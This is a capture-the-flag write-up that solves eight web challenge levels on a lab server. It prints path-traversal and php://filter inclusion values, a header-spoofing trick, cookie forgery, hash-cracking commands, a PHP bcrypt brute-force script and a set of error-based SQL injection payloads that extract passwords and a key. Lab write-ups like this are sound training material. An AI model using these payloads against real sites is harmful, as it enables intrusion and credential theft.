## Solutions

**Note:** Each flag is part of the URL for the next level.

### Level 1 - http://webctfserver/level1/
- Look at HTML comment. Convert Binary to Hex to Ascii using Burp/online tools/scripting
- Ascii to rot13(ascii) gives: `The username and password are what you would find at 40.4168 N, 3.7038 W and 33.5731 N, 7.5898 W`
- Google search for the co-ordinates to find Madrid and Casablanca
- username: Madrid, password: Casablanca
- Flag: 0966615f9af15abfa9bd1ef405b42aef


### Level 2 - http://webctfserver/0966615f9af15abfa9bd1ef405b42aef/
- Look at HTML comment to find a SHA1 string
- Brute force using `hashcat64 -m100 hash.txt rockyou.txt` to get tokyohotel
- Download `/0966615f9af15abfa9bd1ef405b42aef/tokyohotel/backup.sql`
- base64 decode password to obtain 'isveryscaredofthedarkness'
- login using `alice:isveryscaredofthedarkness` to obtain flag
- Flag: 70e6766da6d53898bcd7766a04175836


### Level 3 - http://webctfserver/70e6766da6d53898bcd7766a04175836/
- HTML comment has developer name hinting at possible username `bob`
- username: bob, weak password, password:bob
- From email, flag is in /home/james/ directory
- read using `page=php://filter/read=convert.base64-encode/resource=/home/james/flag.txt`
- Base64 decode to obtain flag
- Can also be read using `page=qqq/../../../../../../../../home/james/flag.txt`
- Flag: 767ca3fb84576846dc53d9efdd51c339


### Level 4 - http://webctfserver/767ca3fb84576846dc53d9efdd51c339/
- HTML shows session.js is loaded
- session.js is obfuscated JS. Beautify and cleanup JS using the developer console or online tools.
- JS reveals login folder name 'level4login'
- sessionStorage contains username & password
- snape:hatedjamespotter
- Flag: 2da51fcf5250842da9426bdcfcd8bbc2


### Level 5 (Hackim Web 100) - http://webctfserver/2da51fcf5250842da9426bdcfcd8bbc2/
 
- Page source reveals an HTML comment: MDkzMWNjMTU2ODNiODdkYTYxODg2YzBmNmQwNjIxYzQ=
- This is base64 decoded to obtain a MD5 hash. 
- Google search shows its value as 'hackim'
- username: hackim; password: hackim
- Can't login, bcz IP not permitted.
- Add X-Forwarded-For header, same as source IP (`X-Forwarded-For: 127.0.0.1`)
- Flag: 4f9361b0302d4c2f2eb1fc308587dfd6


### Level 6 (Hackim Web 200) - http://webctfserver/4f9361b0302d4c2f2eb1fc308587dfd6/

- Register multiple users with different names
- when a limited user logs in, message tells him he cannot see the flag.
- stack cookies and see that the first 10bytes remain static. The r cookie's last 32 chars can be MD5 reveresed to the string 'limited'
- change the cookie value for the 'r' cookie
- md5('admin') to be appended. Set cookie.
- Flag: bb6df1e39bd297a47ed0eeaea9cac7ee


### Level 7 (Hackim Web 400) - http://webctfserver/bb6df1e39bd297a47ed0eeaea9cac7ee/

- Page source shows partial password as kztu6fe1m68mwf7vl1g3grjzmocia043pmno83q3ati98c8r324dzc0hc7n41p6tdjg6p
- Also, HTML comment tells of a database dump >> database.sql
- Database contains table `users` with column `password_bcrypt`. 
- The value of the password hash is $2y$10$FalJ8SmqTDBv7Fr366RC9uW5hKJVZijsDqzgASh1kSGMsUFMMLGZq
- Using the partial password (length 69) and the column name in the db, we know this is BCRYPT which is truncated to 72 chars.
- Brute force the remaining 3 characters (7ld) using the script below (~45 minutes) or using john (~40 seconds)

```
john bcrypthash.txt --mask=kztu6fe1m68mwf7vl1g3grjzmocia043pmno83q3ati98c8r324dzc0hc7n41p6tdjg6p?2?2?2 --min-length=72 --max-length=72
```

```
<?php
$partial = 'kztu6fe1m68mwf7vl1g3grjzmocia043pmno83q3ati98c8r324dzc0hc7n41p6tdjg6p';
$hash = '$2y$10$FalJ8SmqTDBv7Fr366RC9uW5hKJVZijsDqzgASh1kSGMsUFMMLGZq';

$arr=array('a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','0','1','2','3','4','5','6','7','8','9');
foreach($arr as $i) {
    foreach($arr as $j) {   
        foreach($arr as $k) {   
            if (password_verify($partial.$i.$j.$k, $hash)===true){
                echo "Password is: ".$partial.$i.$j.$k;
                break;
            }
        }
    }
}
?>
```
- run using php -f solution.php (takes about 45 mins on standard hardware)
- Flag: b7ebfe2a47f711a7b2b5bff057600a2c


## Level 8 (Hackim Web 500) - http://webctfserver/b7ebfe2a47f711a7b2b5bff057600a2c/

- SQL injection in user agent. Fails the single quote test.
- Get username and password(md5)
- Google search md5 of password.
- login
- LFI via encrypted param
- decrypt using key. Key in DB. Get using SQLi.
- encrypt filename for flag file (flagflagflagflag). Encryption function can be found using Google search.
- read flag

SQL Injection queries

```
' and extractvalue(1, concat(1,(select database())))=0 -- //

' and extractvalue(1, concat(1,(select group_concat(table_name) from information_schema.columns where table_schema=database() AND table_name <> 'accounts' AND table_name <> 'cryptokey')))=0 -- //

' and extractvalue(1, concat(1,(select group_concat(table_name) from information_schema.tables where table_schema=database())))=0 -- //

' and extractvalue(1, concat(1,(select group_concat(column_name) from information_schema.columns where table_schema=database() AND table_name='accounts')))=0 -- //Returns: uid,uname,pwd,age,zipcode

' and extractvalue(1, concat(1,(select uname from accounts)))=0 -- //

' and extractvalue(1, concat(1,(select pwd from accounts)))=0 -- //

' and extractvalue(1, concat(1,(select mid(pwd,16,16) from accounts)))=0 -- //Because password is 32 chars. Reverse MD5 this using Google search.

' and extractvalue(1, concat(1,(select group_concat(column_name) from information_schema.columns where table_schema=database() AND table_name='cryptokey')))=0 -- //Returns: id,keyval,keyfor

' and extractvalue(1, concat(1,(select keyval from cryptokey)))=0 -- //Returns TheTormentofTantalus

```

```
<?php

$enc="PUT ENCRYPTED VALUE HERE";
echo encrypt();
function decrypt($enc){
        $key = "TheTormentofTantalus";
        $data = base64_decode($enc);
        $iv = substr($data, 0, mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC));
        $decrypted = rtrim(mcrypt_decrypt(MCRYPT_RIJNDAEL_128,hash('sha256', $key, true),substr($data, mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC)),MCRYPT_MODE_CBC,$iv),"\0");
        return $decrypted;
}

function encrypt(){
        $plain = "flagflagflagflag";
        //$plain = "flag-hint";
        $key = "TheTormentofTantalus";
        $iv = mcrypt_create_iv(mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC),MCRYPT_DEV_URANDOM);
        $encrypted = base64_encode($iv.mcrypt_encrypt(MCRYPT_RIJNDAEL_128,hash('sha256', $key, true),$plain,MCRYPT_MODE_CBC,$iv));
        return $encrypted;
}

?>
```


